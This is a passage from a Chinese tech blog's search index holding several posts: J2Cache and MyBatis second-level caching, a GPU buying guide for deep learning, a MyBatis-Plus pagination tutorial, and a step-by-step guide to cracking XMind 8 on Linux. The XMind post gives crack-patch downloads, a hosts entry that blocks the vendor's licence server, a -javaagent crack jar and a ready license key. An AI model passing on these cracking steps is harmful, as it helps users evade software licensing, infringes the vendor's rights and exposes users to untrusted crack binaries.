作为二级缓存实现",url:"/posts/ee90f3ef.html",text:'J2Cache 的 Gradle 配置项目中引入以下依赖后，需要根据项目具体的运行状况调整 Gradle 的依赖配置，以下配置使用到 SpringBoot。 123compile \'net.oschina.j2cache:j2cache-core:2.7.6-release\'compile \'net.oschina.j2cache:j2cache-mybatis:2.7.0-release\'compile \'net.oschina.j2cache:j2cache-spring-boot2-starter:2.7.6-release\' MyBatis 的 Mapper 使用 J2Cache首先在 MyBatis 的全局配置中开启二级缓存，然后根据下面的两种情况进行配置（二选一） 1234&lt;settings&gt; &lt;!-- 开启二级缓存，默认true --&gt; &lt;setting name="cacheEnabled" value="true"/&gt;&lt;/settings&gt; 第一种使用情况：对当前 namespace 内的所有 sql 启用二级缓存 1234&lt;mapper namespace="com.example.dao.user.UserApiMapper"&gt; &lt;!-- 指定MyBatis的二级缓存实现类 --&gt; &lt;cache type="net.oschina.j2cache.mybatis.J2CacheAdapter"/&gt;&lt;/mapper&gt; 或者使用 Java 注解进行配置，此写法会导致 XML 映射文件中的其他 SQL 无法使用二级缓存，下面会详细介绍 1234@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; {} 第二种使用情况：对当前 namespace 内指定的 sql 设置是否启用二级缓存 12345678910&lt;mapper namespace="com.example.dao.user.UserApiMapper"&gt; &lt;!-- 指定MyBatis的二级缓存实现类 --&gt; &lt;cache type="net.oschina.j2cache.mybatis.J2CacheAdapter"/&gt; &lt;!-- 通过配置useCache属性，指定当前sql是否启用二级缓存，默认为true，如果设置为false，则每次都会发sql去数据库查询 --&gt; &lt;select id="selectRecord" resultMap="userApiMap" useCache="false"&gt; select * from man_user_api where userid = #{userId} and exchange_id = #{exchangeId} &lt;/select&gt;&lt;/mapper&gt; 或者使用 Java 注解进行配置，此写法会导致 XML 映射文件中的其他 SQL 无法使用二级缓存，下面会详细介绍 12345678@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; { @Options(useCache = false) @Select("select * from man_user_api where userid = #{userId} and exchange_id = #{exchangeId}") public UserApi selectRecord(@Param(("userId")) long userId, @Param("exchangeId") long exchangeId);} 二级缓存的坑MyBatis-Plus 二级缓存不生效官方推荐的方式是统一在 XML 映射文件中配置缓存与 SQL，此方式在 MyBatis + MyBatis-Plus（version &lt;= 2.0.9）的环境下可以正常工作。但是当使用版本号大于 2.0.9 的 MyBatis-Plus，使用 XML 配置缓存的方式会导致 MyBatis-Plus 的二级缓存不生效，具体表现为发出的 SQL（由 MyBatis-Plus 自动生成的 SQL）不能正常使用二级缓存。根据 MyBatis-Plus 官方文档的说明，当使用 2.0.9 以上的版本，需要在代码中 MyBatis 的 Mapper 层添加缓存注释，声明 implementation 的值为 cache 接口的实现类，此时 XML 映射文件中不能再声明 cache 标签，代码如下： 1234@CacheNamespace(implementation = J2CacheAdapter.class)public interface UserApiMapper extends BaseMapper&lt;UserApi&gt; {} MyBatis 二级缓存不生效使用 @CacheNamespace 注解后，MyBatis-Plus 的二级缓存确实是生效了，但在 XML 映射文件中的其他 SQL 此时不能正常使用二级缓存，而在 Mapper 层通过注解声明的 SQL 则不受影响。 二级缓存配置总结不管通过注解还是 XML 的方式配置缓存，总结大概有以下几种使用情况。实际开发中可以根据不同的业务需求混合使用不同的配置方式，第一种方式适合 SQL 比较复杂的业务场景，第三种方式适合 SQL 比较简单的业务场景，推荐第一种方式。 第一种：MyBatis 单独正常使用二级缓存，将所有 SQL、缓存配置都写在 XML 映射文件中，此时 MyBatis-Plus 的二级缓存失效； 第二种：MyBatis-Plus 正常使用二级缓存，在 Mapper 层声明注解 @CacheNamespace，此时 MyBatis 的二级缓存失效（针对 XML 中定义的 SQL），而 MyBatis 通过 Java 注解定义的 SQL 则依然会生效； 第三种：MyBatis 与 MyBatis-Plus 同时正常使用二级缓存，将所有 SQL、缓存配置通过注解的方式定义在 Mapper 层；此时 XML 映射文件中不能再定义 SQL，否则 XML 中的 SQL 无法使用二级缓存。 指定 J2Cache 的缓存大小与有效时间当 J2Cache 作为 MyBatis 的二级缓存实现，J2Cache 官方支持在配置文件中指定缓存的大小与有效时间，具体配置如下： 12345678910# redis storage mode (generic|hash)lettuce.storage = generic# Enable/Disable ttl in redis cache data (if disabled, the object in redis will never expire, default:true)# NOTICE: redis hash mode (redis.storage = hash) do not support this feature)j2cache.sync_ttl_to_redis = true# ttl for one level cache# [name] = size, xxxx[s|m|h|d]caffeine.region.default = 1000, 30m 重点关注的配置是 “caffeine.region.default”，上面配置了默认 Region（区域）的一级缓存大小为 1000，有效时间为 30 分钟。举个例子，如果需要为 UserAPI 表的记录单独设置缓存大小和有效时间，可以参考以下配置；其中 Region 是 Mapper 的类全名，大小为 2000，有效时间为 12 小时。当 J2Cache 找不到对应的 Region，默认会采用 “caffeine.region.default” 的配置策略。 1caffeine.region.com.example.dao.user.UserApiMapper = 2000, 12h 基于 SpringBoot 的单元测试类当 MyBatis 的 Mapper 使用 J2Cache 作为二级缓存的实现，那么单元测试类中暂时需要指定 J2Cache 的相关配置，否则测试类无法正常启动。如果每个测试类都要加上一堆 J2Cache 的配置内容，实在是不方便，而且 J2Cache 的配置一旦更改，则需要修改每个测试类的代码。为了解决这种情况，可以在模块下创建 BaseSpringBootTest 基础测试类，然后其他测试类直接继承基础测试类即可。 123456789101112131415161718192021222324252627282930313233/** * 基础测试类 */@RunWith(SpringRunner.class)@SpringBootTest(properties = { "j2cache.l2-cache-open=true", "j2cache.open-spring-cache=true", "j2cache.allow-null-values=true", "spring.cache.type=GENERIC", "j2cache.cache-clean-mode=passive", "j2cache.config-location=classpath:j2cache.properties"})public class BaseSpringBootTest { protected Logger logger = LoggerFactory.getLogger(BaseSpringBootTest.class);}/** * 具体的测试类实现 */public class J2CacheMyBatisTest extends BaseSpringBootTest { @Autowired private UserApiMapper apiMapper; private Logger logger = LoggerFactory.getLogger(J2CacheMyBatisTest.class); @Test public void util() { UserApi api = apiMapper.selectById(1L); logger.info("===&gt; " + api); }} J2Cache 的配置文件J2Cache 支持使用 Redis 或者 RabbitMQ 的 Pub/Sub 服务，支持使用 Ehcache、Caffeine 作为一级缓存，支持使用 Jedis、Lettuce 作为 Redis 的客户端。目前 J2Cache 最主要的配置内容只能写在 j2cache.properties 文件中，如果将配置内容全部移动到 SpringBoot 的 xxx.yml 文件中，SpringBoot 应用的启动与单元测试都会出错，这与 J2Cache 的源码有关。 临时关闭 MyBatis 使用 J2Cache在 MyBatis 的全局配置中，关闭二级缓存即可。 1234&lt;settings&gt; &lt;!-- 关闭二级缓存，默认true --&gt; &lt;setting name="cacheEnabled" value="false"/&gt;&lt;/settings&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 缓存"},{title:"Linux 破解安装 XMind8",url:"/posts/d32cbc24.html",text:'相关站点 XMind 8 官网下载：XMind 8 XMind 8 破解补丁下载（本站）： XMind_amd64.tar.gz XMind 8 破解补丁下载（百度网盘）： 网盘地址 提取码：tnkb 安装 JDK 8 由于 XMind 8 的 Linux 版是基于 Eclipse 开发的，因此需要手动安装 JDK 8，建议将 JDK 8 的安装路径添加到系统的环境变量中，这里不再累述。特别注意，这里安装的 JDK 版本必须为 8，否则会引起 XMind 8 启动失败等问题；如果系统中存在多个 JDK 版本，可参考文章末尾给出的解决方案，手动指定 JDK 的安装路径。 XMind 8 破解安装 12345678910111213141516171819202122232425# 创建安装目录# mkdir -p /usr/local/xmind-8# 解压XMind的安装文件# unzip -d /usr/local/xmind-8 xmind-8-update8-linux.zip# 拷贝破解补丁文件到XMind_amd64目录# cp XMind_amd64.tar.gz /usr/local/xmind-8/XMind_amd64# 解压破解补丁文件# cd /usr/local/xmind-8/XMind_amd64# tar -xvf XMind_amd64.tar.gz# rm -f XMind_amd64.tar.gz# 如果系统环境是Centos，则需要修改安装脚本，将脚本里自动安装软件的命令注释掉，默认的脚本只适合Debian/Ubuntu系统# vim /usr/local/xmind-8/setup.sh## apt-get install openjdk-8-jre libgtk2.0-0 libwebkitgtk-1.0-0 lame libc6 libglib2.0-0 # Centos环境下，注释这行内容# 执行安装脚本# cd /usr/local/xmind-8# ./setup.sh# 修改Hosts# vim /etc/hosts127.0.0.1 www.xmind.net 运行并激活 XMind 8 进入 XMind_amd64 目录，执行命令 ./XMind 启动 XMind，然后在 XMind 的主界面导航到：Help -&gt; License，复制以下 License Key 进行激活即可，XMind 8 界面上的邮箱地址可以随便填。 1XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345 激活成功的截图 XMind 的 Linux 版是基于 Eclipse 开发的，以上破解安装方法适用于 Windows、Mac、Linux 系统，其中被替换的 XMind.ini 文件也只是在原始文件末尾添加了一行内容 -javaagent:./XMindCrack.jar 来执行 Crack 文件。 解决 XMind 8 由于找不到本地安装的 JDK 而导致启动失败的问题 编辑 /usr/local/xmind-8/XMind_amd64/XMind.ini 配置文件（64 位系统选择 AMD-64 的配置文件），在 -vmargs 的前面添加以下内容来指定 JDK 的安装路径（自行修改），然后再重新启动 XMind 8 即可。 12-vm/usr/java/jdk1.8.0_102/bin/java var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 开发工具"},{title:"如何选择 GPU 搭建深度学习机器",url:"/posts/53e1dc9b.html",text:'深度学习与 GPU 介绍深度学习（DL）是机器学习（ML）的一个分支，深度学习使用神经网络来解决问题。神经网络的优点之一是自行寻找数据（特征）模式，这和以前告诉算法需要找什么不一样。但是，通常这意味着该模型从空白状态开始（除非使用迁移学习）。为了从头捕捉数据的本质／模式，神经网络需要处理大量信息，通常有两种处理方式：使用 CPU 或 GPU。计算机的主要计算模块是中央处理器（CPU），CPU 的设计目的是在少量数据上执行快速计算。在 CPU 上添加数倍的数字非常快，但是在大量数据上进行计算就会很慢。如，几十、几百或几千次矩阵乘法。在表象背后，深度学习多由矩阵乘法之类的操作组成。有趣的是，3D 电子游戏同样依赖这些操作来渲染那些美丽的风景。因此，GPU 的作用被开发出来，它们可以使用数千个核心处理大量并行计算。此外，它们还有大量内存带宽处理数据。这使得 GPU 成为进行 DL 的完美硬件。总之，尽管使用 CPU 进行深度学习从技术上是可行的，想获得真实的结果就应该使用 GPU。 GPU 选择的性能指标选择一个强大的图形处理器最重要的理由是节省时间和开发原型模型。网络训练速度加快，反馈时间就会缩短。这样就可以更轻松地将模型假设和结果之间建立联系。深度学习相关的主要 GPU 性能指标如下： 处理能力：表示 GPU 处理数据的速度，可以将其量化为 CUDA 核心数量和每一个核心的频率的乘积。 显存带宽：GPU 处理大量数据的能力，是最重要的性能指标。 显存大小：一次性加载到显卡上的数据量。运行计算机视觉模型时，显存越大越好，特别是如果想参加 CV Kaggle 竞赛的话。对于自然语言处理和数据分类，显存没有那么重要。 GPU 显存大小选择原则 追求最高水准的研究：&gt;=11 GB 探索有趣架构的研究：&gt;=8 GB 任何其他研究：8 GB CV Kaggle 竞赛：4～8 GB 初创企业：8 GB（不过要根据特定应用领域情况来确定模型规模） 选择 Nvidia 还是 AMD 平台英伟达已经关注深度学习有一段时间，并取得了领先优势。他们的 CUDA 工具包具备扎实的技术水平，可用于所有主要的深度学习框架 ——TensorFlow、PyTorch、Caffe、CNTK 等。但截至目前，这些深度学习框架都不能在 OpenCL（运行于 AMD GPU）上工作。由于市面上的 AMD GPU 便宜得多，希望这些框架对 OpenCL 的支持能尽快实现。而且，一些 AMD 卡还支持半精度计算，从而能将性能和显存大小加倍。不过 AMD 已经发布了 ROCm 平台提供深度学习支持，它同样适用于主流深度学习库（如 PyTorch、TensorFlow、MxNet 和 CNTK）。目前，ROCm 仍然在不断开发中，如果只是希望 GPU 可以顺利运行的普通深度学习用户，建议还是选择英伟达平台。 Nvidia 显卡选择入门级别的 GTX 10 系列显卡（2017 年上市） GTX 1050 Ti：显存 4G，显存带宽 112 GB/s，768 个 CUDA 核心 @ 1392 MHz，这是一款入门级 GPU，如果不确定是否要做深度学习，那么选择这款不用花费太多钱就可以体验一下。 GTX 1060：显存 6G，显存带宽 216 GB/s，1280 个 CUDA 核心 @ 1708 MHz，相对来说价格比较便宜，但是 6GB 显存对于深度学习任务可能不够用。如果要做计算机视觉，那么这可能是最低配置。如果做 NLP 和分类数据模型，这款还可以。 GTX 1070： 显存 8G，显存带宽 256 GB/s，1920 个 CUDA 核心 @ 1683 MHz，现在很难买到这款 GPU 了，因为它们主要用于虚拟货币挖矿。它的显存配得上这个价位，就是速度有些慢。如果能用较便宜的价格买到一两个二手的非矿机卡，那就建议下手。 GTX 1070 Ti：显存 8G，显存带宽 256 GB/s，2432 个 CUDA 核心 @ 1683 MHz，如果觉得 GTX 1080 超出了预算，1070 Ti 可以提供同样大的 8GB 显存，以及大约 80% 的性能。 GTX 1080： 显存 8G，显存带宽 320 GB/s，2560 个 CUDA 核心 @ 1733 MHz，作为目前英伟达产品线里的中高端显卡，8GB 的内存对于计算机视觉任务来说够用了。大多数 Kaggle 上的人都在使用这款显卡。 GTX 1080 Ti：显存 11G，显存带宽 484 GB/s，3584 个 CUDA 核心 @ 1582 MHz，拥有大容量显存和高吞吐量，如果资金允许，它是一个很好的选择，GTX 1080 Ti 可以完成计算机视觉任务，并在 Kaggle 竞赛中保持强势。 Titan XP：显存 12G，显存带宽 547.7 GB/s，3840 个 CUDA 核心 @ 1480 MHz，Titan XP 的性价比不高，一块 Titan XP 的价格可以买到两块 GTX 1080，而且意味着更强大的算力和 16GB 的显存。 入门级别的 RTX 20 系列显卡（2019 年上市） 专业级别的 Tesla 系列显卡（2019 年上市）英伟达还拥有一个面向专业市场的 Tesla GPU 产品线，其中包括 P40、P4、V100 型号。这类型的显卡价格十分昂贵，一般很少能够接触到，但 Amazon Web Services、谷歌云平台或其他云供应商正在使用这些 GPU。 一句话推荐总结在这里，将给出不同预算区间下 GTX 10 系列显卡的最佳选择（以下显卡价格随着时间迁移会大幅波动，价格参考自 2018 年）。 2000 元以下：在这个区间内，GTX 1050 Ti 是最佳选择，但如果真的想做深度学习，请加钱上 GTX 1060。 2000-2600 元区间：GTX 1060 可以让你入门深度学习，如果可以找到成色不错的二手 GTX 1070 那就更好了。 2600-4600 元区间：可选 GTX 1080 或 GTX 1070 Ti，如果真的需要 SLI 的话或许两块 GTX 1060 也是可以的，但请注意 6GB 显存可能会不够用。 4600-6000 元区间：首推 GTX 1080 Ti，如果需要双显卡 SLI，请购买两块 GTX 1070 或两块 GTX 1070 Ti。 2019 年 Nvidia 新一代的 RTX 20 系列显卡已经上市，本着买新不买旧的原则，预算足够的前提下建议选择 RTX 2070、RTX 2080、RTX 2080 Ti。一般来说，有两种主要的选择策略是有意义的：第一，使用 RTX 20 系列 GPU 进行快速升级；第二，使用便宜的 GTX 10 系列 GPU 并在 RTX Titan 可用时进行升级。如果性能不太重要，或者只是不需要性能，例如 Kaggle、初创公司、原型开发或者学习深度学习，那么可以从廉价的 GTX 10 系列中受益，如果选择 GTX 10 系列要注意 GPU 的显存大小是否满足实际使用的要求。 深度学习常用工具 gpu driver：显卡驱动 cuda：GPU 上的并行计算平台和模型 pytorch：一个基于 Python 语言的深度学习框架 cudnn：相比标准的 cuda，它在一些常用的神经网络操作上进行了性能的优化 anaconda：一个开源的 Python 发行版本，其包含了 conda、python 等 180 多个科学包及其依赖项 tensorflow：一个基于数据流编程的符号数学系统，被广泛应用于各类机器学习算法的编程实现 keras：一个基于 Python 的深度学习库，提供了高层神经网络 API，后端可以选择 Tensorflow、Theano 以及 CNTK 参考文章 如何选择深度学习的 GPU 研究深度学习的硬件配置 完全硬件指南：教你 DIY 一套自己的深度学习机器 GPU 对比，Titan XP/GTX 1080 Ti/GTX 1080 谁更有优势 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"MyBatis-Plus 入门教程之六",url:"/posts/315d5197.html",text:'大纲 MyBatis-Plus 入门教程之一 MyBatis-Plus 入门教程之二 MyBatis-Plus 入门教程之三 MyBatis-Plus 入门教程之四 MyBatis-Plus 入门教程之五 MyBatis-Plus 入门教程之六 MyBatis-Plus 入门教程之七 前言版本说明本文的教程内容是基于 MyBatis-Plus 3.5.2 版本编写的，若你使用的是 2.x 或其他版本，可能会有部分知识点、案例代码不兼容，一切以 MyBatis-Plus 官方文档为准。 MyBatis-Plus 插件介绍InnerInterceptor 接口MyBatis-Plus 的插件都是基于 InnerInterceptor 接口来实现的，目前已有的插件： 分页 - PaginationInnerInterceptor 多租户 - TenantLineInnerInterceptor 动态表名 - DynamicTableNameInnerInterceptor 乐观锁 - OptimisticLockerInnerInterceptor SQL 性能规范 - IllegalSQLInnerInterceptor 防止全表更新与删除 - BlockAttackInnerInterceptor 使用多个插件时需要注意顺序关系，建议使用如下顺序 多租户、动态表名 分页、乐观锁 SQL 性能规范、防止全表更新与删除 总结：对 SQL 进行单次改造的优先放入，不对 SQL 进行改造的最后放入 忽略插件拦截的注解@InterceptorIgnore 注解可用于忽略插件的拦截，支持注解在 Mapper 上以及 Mapper 方法上，若两者同时存在则 Mapper 方法 比 Mapper 的优先级高。各属性表示对应的插件，支持取值为 true 和 false、1 和 0、on 和 off。属性值返回 true 表示不走插件（在配置了插件的情况下，不填则默认表示 false）。属性列表如下： 属性名 类型 默认值 描述 tenantLine String “” 行级租户 dynamicTableName String “” 动态表名 blockAttack String “” 攻击 SQL 阻断解析器，防止全表更新与删除 illegalSql String “” 垃圾 SQL 拦截 更多的使用说明详见 @InterceptorIgnore 注解的源码注释 MyBatis-Plus 插件使用本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-07。 MyBatis-Plus 分页插件分页插件的介绍PaginationInnerInterceptor 分页拦截器类的属性说明如下： 属性名 类型 默认值 描述 overflow boolean false 溢出总页数后是否进行处理 (默认不处理，参见 插件#continuePage 方法) maxLimit Long 单页分页条数限制 (默认无限制，参见 插件#handlerLimit 方法) dbType DbType 数据库类型 (根据类型获取应使用的分页方言，参见 插件#findIDialect 方法) dialect IDialect 方言实现类 (参见 插件#findIDialect 方法) 注意 建议单一数据库类型的均设置 dbType 属性，避免每次分页都去抓取数据库类型 生成 countSql 会在 left join 的表不参与 where 条件的情况下，把 left join 优化掉 所以建议任何带有 left join 的 SQL，都写成标准 SQL，即给于表一个别名，字段也要 别名.字段 分页插件的使用分页插件的配置步骤 只需要使用 Spring XML 方式、 SpringBoot 配置类方式或者 MyBatis 配置文件方式中的任意一种配置乐观锁插件即可。 配置分页插件注入 MybatisPlusInterceptor 类，并配置 PaginationInnerInterceptor 拦截器。 Spring XML 方式12345678910111213141516171819&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="plugins"&gt; &lt;array&gt; &lt;ref bean="mybatisPlusInterceptor"/&gt; &lt;/array&gt; &lt;/property&gt;&lt;/bean&gt;&lt;bean id="mybatisPlusInterceptor" class="com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor"&gt; &lt;property name="interceptors"&gt; &lt;list&gt; &lt;ref bean="paginationInnerInterceptor"/&gt; &lt;/list&gt; &lt;/property&gt;&lt;/bean&gt;&lt;bean id="paginationInnerInterceptor" class="com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor"&gt; &lt;constructor-arg name="dbType" value="MYSQL"/&gt;&lt;/bean&gt; SpringBoot 配置类方式 配置类 1234567891011121314151617181920/** * MyBatis-Plus 配置类 */@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { /** * 添加 MyBatis-Plus 分页插件 * * @return */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL)); return interceptor; }} 若 MyBatis-Plus 使用的是较低的版本（例如 3.3.1），则配置类的写法如下： 123456789101112131415161718/** * MyBatis-Plus 配置类 */@Configuration@MapperScan("com.clay.mybatis.dao")public class MyBatisPlusConfiguration { /** * 分页插件 */ @Bean public PaginationInterceptor paginationInterceptor() { PaginationInterceptor paginationInterceptor = new PaginationInterceptor(); paginationInterceptor.setDbType(DbType.MYSQL); return paginationInterceptor; }} 启动类 提示 特殊情况下，可能还需要在启动类上通过 @ComponentScan 注解来扫描上面定义的 MybatisPlusConfig 配置类。 123456789@SpringBootApplication@ComponentScan("com.clay.mybatis")public class MyBatisPlusApplication { public static void main(String[] args) { SpringApplication.run(MyBatisPlusApplication.class, args); }} MyBatis 配置文件方式123456789&lt;configuration&gt; &lt;plugins&gt; &lt;!-- property 的配置说明详见 MybatisPlusInterceptor.setProperties() 的源码方法注释 --&gt; &lt;plugin interceptor="com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor"&gt; &lt;property name="@page" value="com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor"/&gt; &lt;property name="page:dbType" value="mysql"/&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; 分页操作（基于 AR 模式）MyBatis-Plus 分页插件支持在 ActiveRecord 模式下使用，示例代码如下。 实体类 12345678910111213141516public class Employee extends Model&lt;Employee&gt; { private Long id; private String lastName; private String gender; private String email; private Integer age; .... @Override public Serializable pkVal() { return this.id; }} Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Junit 测试代码 123456789101112131415161718192021222324252627282930313233@SpringBootTestpublic class PagePluginTest { /** * 基于 ActiveRecord 模式的分页查询 */ @Test public void selectByPageForAR() { // 分页信息 Page&lt;Employee&gt; page = new Page&lt;&gt;(2, 2); // 查询条件 QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.eq("gender", "1"); // 执行分页查询 Employee employee = new Employee(); employee.selectPage(page, wrapper); // 获取分页结果 List&lt;Employee&gt; list = page.getRecords(); list.forEach(System.out::println); // 获取分页信息 System.out.println("总页数： " + page.getPages()); System.out.println("总记录数： " + page.getTotal()); System.out.println("当前的页码： " + page.getCurrent()); System.out.println("每页的记录数： " + page.getSize()); System.out.println("是否有上一页： " + page.hasPrevious()); System.out.println("是否有下一页： " + page.hasNext()); }} 执行上面的测试代码后，控制台输出的日志信息如下： 123456789101112131415161718192021==&gt; Preparing: SELECT COUNT(*) AS total FROM t_employee WHERE (gender = ?)==&gt; Parameters: 1(String)&lt;== Columns: total&lt;== Row: 4&lt;== Total: 1==&gt; Preparing: SELECT id,email,last_name,gender,age FROM t_employee WHERE (gender = ?) LIMIT ?,?==&gt; Parameters: 1(String), 2(Long), 2(Long)&lt;== Columns: id, email, last_name, gender, age&lt;== Row: 3, jim@gmail.com, Jim, 1, 26&lt;== Row: 4, peter@gmail.com, Peter, 1, 29&lt;== Total: 2Employee [id=3, lastName=Jim, gender=1, email=jim@gmail.com, age=26]Employee [id=4, lastName=Peter, gender=1, email=peter@gmail.com, age=29]总页数： 2总记录数： 4当前的页码： 2每页的记录数： 2是否有上一页： true是否有下一页： false 分页操作（基于通用 Mapper）MyBatis-Plus 分页插件支持通用 Mapper 的使用，示例代码如下。 Mapper 接口 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Junit 测试代码 1234567891011121314151617181920212223242526272829303132333435@SpringBootTestpublic class PagePluginTest { @Autowired private EmployeeMapper empMapper; /** * 基于通用 Mapper 的分页查询 */ @Test public void selectByPage() { // 分页信息 Page&lt;Employee&gt; page = new Page&lt;&gt;(2, 2); // 查询条件 QueryWrapper&lt;Employee&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.eq("gender", "1"); // 执行分页查询 empMapper.selectPage(page, wrapper); // 获取分页结果 List&lt;Employee&gt; list = page.getRecords(); list.forEach(System.out::println); // 获取分页信息 System.out.println("总页数： " + page.getPages()); System.out.println("总记录数： " + page.getTotal()); System.out.println("当前的页码： " + page.getCurrent()); System.out.println("每页的记录数： " + page.getSize()); System.out.println("是否有上一页： " + page.hasPrevious()); System.out.println("是否有下一页： " + page.hasNext()); }} 分页操作（基于自定义 Mapper 方法）MyBatis-Plus 分页插件支持自定义 Mapper 方法的分页查询，示例代码如下。 Mapper 接口 提示 1、自定义 Mapper 方法时，需要指定返回值的类型为 IPage 或 List，同时还需要指定其中的一个方法参数的类型为 IPage 2、若自定义 Mapper 方法的返回类型是 IPage，则入参的 IPage 不能为 null，因为返回的 IPage 等于入参的 IPage；如果想临时不分页，可以在初始化 IPage 时指定 size 属性为小于零的值即可 3、若自定义 Mapper 方法的返回类型是 List，则入参的 IPage 可以为 null（为 null 则表示不分页） 4、若在 SQL 映射文件中，需要从 page 对象里取值，可以使用 page.属性名 的方式来获取 123456789101112131415161718192021public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; { /** * 第一种方式：方法的返回值为 IPage 类型 * * @param page * @param gender * @return */ IPage&lt;Employee&gt; queryByPage(IPage&lt;Employee&gt; page, @Param("gender") String gender); /** * 第二种方式：方法的返回值为 List 类型 * * @param page * @param gender * @return */ List&lt;Employee&gt; queryListByPage(IPage&lt;Employee&gt; page, @Param("gender") String gender);} SQL 映射文件 123456789101112131415&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="queryByPage" resultType="Employee"&gt; select id, email, last_name as lastName, gender, age from t_employee where gender = #{gender} &lt;/select&gt; &lt;select id="queryListByPage" resultType="Employee"&gt; select id, email, last_name as lastName, gender, age from t_employee where gender = #{gender} &lt;/select&gt;&lt;/mapper&gt; Junit 测试代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@SpringBootTestpublic class PagePluginTest { @Autowired private EmployeeMapper empMapper; /** * 基于自定义 Mapper 方法（返回值为 IPage）的分页查询 */ @Test public void queryByPage() { // 分页信息 Page&lt;Employee&gt; page = new Page&lt;&gt;(2, 2); // 执行分页查询 empMapper.queryByPage(page, "1"); // 获取分页结果 List&lt;Employee&gt; list = page.getRecords(); list.forEach(System.out::println); // 获取分页信息 System.out.println("总页数： " + page.getPages()); System.out.println("总记录数： " + page.getTotal()); System.out.println("当前的页码： " + page.getCurrent()); System.out.println("每页的记录数： " + page.getSize()); System.out.println("是否有上一页： " + page.hasPrevious()); System.out.println("是否有下一页： " + page.hasNext()); } /** * 基于自定义 Mapper 方法（返回值为 List）的分页查询 */ @Test public void queryListByPage() { // 分页信息 Page&lt;Employee&gt; page = new Page&lt;&gt;(2, 2); // 执行分页查询 List&lt;Employee&gt; list = empMapper.queryListByPage(page, "1"); list.forEach(System.out::println); // 获取分页信息 System.out.println("总页数： " + page.getPages()); System.out.println("总记录数： " + page.getTotal()); System.out.println("当前的页码： " + page.getCurrent()); System.out.println("每页的记录数： " + page.getSize()); System.out.println("是否有上一页： " + page.hasPrevious()); System.out.println("是否有下一页： " + page.hasNext()); }} MyBatis-Plus 乐观锁插件本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-08。 真实业务场景一件商品，成本价是 80 元，售价是 100 元。老板先是通知小李，说你去把商品价格增加 50 元。小李正在玩游戏，耽搁了一个小时。正好一个小时后，老板觉得商品价格增加到 150 元，价格太高，可能会影响销量。又通知小王，你把商品价格降低 30 元。此时，小李和小王同时操作商品后台系统。小李操作的时候，系统先取出商品价格 100 元；小王也在操作，取出的商品价格也是 100 元。小李将价格加了 50 元，并将 100 + 50 = 150 元存入了数据库；小王将商品减了 30 元，并将 100 - 30 = 70 元存入了数据库。是的，如果没有锁，小李的操作就完全被小王的覆盖了。现在商品价格是 70 元，比成本价低 10 元。几分钟后，这个商品很快出售了 1 千多件商品，老板亏了 1 